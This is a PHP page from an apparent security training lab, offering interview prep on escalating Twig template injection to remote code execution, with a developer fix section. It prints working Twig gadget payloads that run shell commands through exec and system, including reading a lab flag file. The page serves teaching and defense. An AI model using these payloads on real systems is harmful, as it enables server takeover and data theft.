<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'S2 Interview Prep — SSTI to RCE';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div style="margin-bottom:24px;">
      <a href="/ssti_s2.php" style="font-size:0.82rem;color:var(--text-muted);">&larr; Back to Lab S2</a>
      &nbsp;&nbsp;
      <a href="/index.php" style="font-size:0.82rem;color:var(--text-muted);">Hub</a>
    </div>

    <div class="interview-section">
      <h1 style="font-size:1.4rem;margin-bottom:6px;">Lab S2 — SSTI &rarr; RCE</h1>
      <p style="color:var(--text-muted);font-size:0.875rem;">Interview Prep · Twig RCE Gadget Chain</p>
    </div>

    <!-- 30-Second Explanation -->
    <div class="interview-section">
      <h2>30-Second Explanation</h2>
      <div class="thirty-sec">
        Twig SSTI escalates to RCE by exploiting the <code>_self</code> object to register a PHP callable as a filter handler. The <code>registerUndefinedFilterCallback</code> gadget lets you call any PHP function — including <code>exec()</code> — by passing a command string as a filter name.
      </div>
    </div>

    <!-- Common Interview Questions -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s2q1">
        <label class="qa-question" for="s2q1">How does SSTI become RCE in Twig?</label>
        <div class="qa-answer">
          Twig's <code>_self</code> object exposes the template environment. The environment's <code>registerUndefinedFilterCallback</code> method registers a PHP callable to handle unknown filter names. By registering <code>exec</code>, subsequent calls to <code>getFilter("cmd")</code> invoke <code>exec("cmd")</code> and return the last line of output. The full chain:<br><br>
          <div class="oneliner" style="margin:10px 0;">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</div>
          Step 1: <code>registerUndefinedFilterCallback("exec")</code> — sets PHP's <code>exec()</code> as the unknown-filter handler.<br>
          Step 2: <code>getFilter("id")</code> — triggers the handler; PHP calls <code>exec("id")</code> and returns the last output line.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s2q2">
        <label class="qa-question" for="s2q2">Why is Twig's sandbox extension important?</label>
        <div class="qa-answer">
          Twig's <strong>Sandbox extension</strong> restricts which classes, methods, properties, and functions are accessible within templates. Without it, template code can traverse PHP object graphs freely — accessing internal environment objects, calling arbitrary methods, and escalating to RCE as shown in S2. With sandbox enabled and a strict allowlist, the <code>_self.env</code> traversal is blocked entirely. The sandbox is the primary mitigation when user-supplied template <em>logic</em> (not just data) is a business requirement.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s2q3">
        <label class="qa-question" for="s2q3">What changed between Twig 1, 2, and 3 for SSTI exploitation?</label>
        <div class="qa-answer">
          <ul style="padding-left:1.2em;line-height:1.9;">
            <li><strong>Twig 1</strong>: <code>_self</code> exposed <code>getEnvironment()</code> directly, allowing immediate access to the environment object without the callback registration step.</li>
            <li><strong>Twig 2+</strong>: Direct environment access was removed. The <code>registerUndefinedFilterCallback</code> gadget became the standard RCE chain.</li>
            <li><strong>Twig 3</strong>: The gadget still works. Always test against the specific installed version — check <code>composer.lock</code> or <code>{{""|twig_constant('Twig\\Environment::VERSION')}}</code> if you have output.</li>
          </ul>
          The key takeaway: SSTI gadgets are version-specific. Pin the version before choosing your exploit chain.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s2q4">
        <label class="qa-question" for="s2q4">What PHP functions can you use once you have the callback registered?</label>
        <div class="qa-answer">
          Any PHP function that takes a string argument and returns a string or is available as a callable can be used. Common choices:
          <ul style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><code>exec</code> — returns last line of command output (quiet; use for single-line reads)</li>
            <li><code>system</code> — prints all output directly (useful for verbose output)</li>
            <li><code>passthru</code> — similar to system</li>
            <li><code>shell_exec</code> — returns all output as a string</li>
          </ul>
          Note: <code>exec</code> only returns the <em>last line</em> of output. For multi-line files, pipe through <code>tail -1</code> or use a different function. Flag files are typically single-line, so <code>exec</code> works cleanly.
        </div>
      </div>
    </div>

    <!-- One-Liners -->
    <div class="interview-section">
      <h2>Twig RCE Gadgets</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Twig 3 — exec gadget (returns last line)</div>
          <div class="oneliner">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flags/lab_s2.txt")}}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Twig 3 — system gadget (prints all output)</div>
          <div class="oneliner">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Confirm RCE identity</div>
          <div class="oneliner">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</div>
        </div>
      </div>
    </div>

    <!-- Developer Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="font-size:0.875rem;color:var(--text-muted);line-height:1.7;">
        <p style="margin-bottom:10px;">Primary fix: <strong>never use <code>createTemplate()</code> with user input</strong>. Use <code>render()</code> with a static, pre-compiled template file:</p>
        <div class="terminal" style="margin-bottom:12px;">
          <span class="comment">// VULNERABLE</span><br>
          <span style="color:var(--red);">$template = $twig->createTemplate("Hello " . $name . "!");</span><br>
          <br>
          <span class="comment">// SAFE</span><br>
          <span style="color:var(--green, #4ade80);">$output = $twig->render('greeting.html.twig', ['name' => $name]);</span>
        </div>
        <p>If user-defined template logic is a business requirement, enable the <strong>Twig SandboxExtension</strong> with a strict allowlist of permitted tags, filters, functions, and methods. Ensure the <code>_self</code> object and environment methods are not in the allowlist.</p>
      </div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Interview Red Flags</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div class="red-flag-item">&#9888; Saying SSTI is "just like XSS but on the server" — it's a completely different class with RCE potential.</div>
        <div class="red-flag-item">&#9888; Not knowing what <code>_self</code> is in Twig or that it exposes internal environment objects.</div>
        <div class="red-flag-item">&#9888; Claiming "Twig is safe by default against SSTI" — it is only safe if you use the correct API.</div>
        <div class="red-flag-item">&#9888; Ignoring version differences — gadgets are version-specific and must be verified against the target.</div>
      </div>
    </div>

    <div style="margin-top:24px;">
      <a href="/ssti_s2.php" class="btn btn-primary btn-sm">Go to Lab S2</a>
      &nbsp;
      <a href="/index.php" class="btn btn-ghost btn-sm">Hub</a>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
